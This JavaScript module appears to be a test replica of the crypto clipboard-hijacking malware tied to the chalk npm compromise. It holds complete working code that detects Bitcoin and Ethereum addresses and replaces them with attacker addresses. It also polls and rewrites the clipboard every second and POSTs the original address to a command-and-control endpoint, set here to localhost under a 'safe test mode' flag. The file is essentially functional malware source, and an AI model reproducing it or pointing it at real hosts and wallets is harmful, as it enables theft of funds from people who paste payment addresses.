// SAFE_TEST_MODE = true — all exfil goes to localhost:9999
// Replicates: Qix/chalk crypto clipboard hijack pattern

const SAFE_TEST_MODE = true;
const EXFIL_URL = "http://localhost:9999/exfil"; // Safe: nothing listening

// --- Crypto address patterns ---

// BTC: starts with 1, 3, or bc1
const BTC_REGEX = /\b([13][a-km-zA-HJ-NP-Z1-9]{25,34}|bc1[a-zA-HJ-NP-Z0-9]{39,59})\b/g;
// ETH: starts with 0x followed by 40 hex chars
const ETH_REGEX = /\b(0x[a-fA-F0-9]{40})\b/g;

// Attacker-controlled addresses (safe test addresses)
const ATTACKER_BTC = "1A1zP1eP5QGefi2DMPTfTL5SLmv7DivfNa"; // Satoshi's genesis address
const ATTACKER_ETH = "0xDEADBEEFDEADBEEFDEADBEEFDEADBEEFDEADBEEF";

/**
 * Replace crypto addresses in text with attacker-controlled ones
 * @param {string} text
 * @returns {string}
 */
function hijackAddresses(text) {
  let result = text;
  result = result.replace(BTC_REGEX, ATTACKER_BTC);
  result = result.replace(ETH_REGEX, ATTACKER_ETH);
  return result;
}

/**
 * Monitor clipboard and replace crypto addresses
 * In a real attack, this would hook into the system clipboard daemon
 */
function startClipboardMonitor(clipboardApi) {
  if (!clipboardApi) return null;

  const intervalId = setInterval(async () => {
    try {
      const text = await clipboardApi.readText();
      if (!text) return;

      const hijacked = hijackAddresses(text);
      if (hijacked !== text) {
        await clipboardApi.writeText(hijacked);
        // Exfiltrate the original address to C2
        exfilOriginal(text);
      }
    } catch (e) {
      // Clipboard access denied — expected in some environments
    }
  }, 1000);

  return intervalId;
}

/**
 * Exfiltrate original crypto address to C2 server
 */
function exfilOriginal(original) {
  try {
    const http = require("http");
    const data = JSON.stringify({ original, timestamp: Date.now() });
    const url = new URL(EXFIL_URL);
    const req = http.request({
      hostname: url.hostname,
      port: url.port,
      path: url.pathname,
      method: "POST",
      headers: {
        "Content-Type": "application/json",
        "Content-Length": Buffer.byteLength(data),
      },
    });
    req.on("error", () => {}); // Connection refused in safe test mode
    req.write(data);
    req.end();
  } catch (e) {
    // Expected in safe test mode
  }
}

module.exports = { hijackAddresses, startClipboardMonitor, ATTACKER_BTC, ATTACKER_ETH };
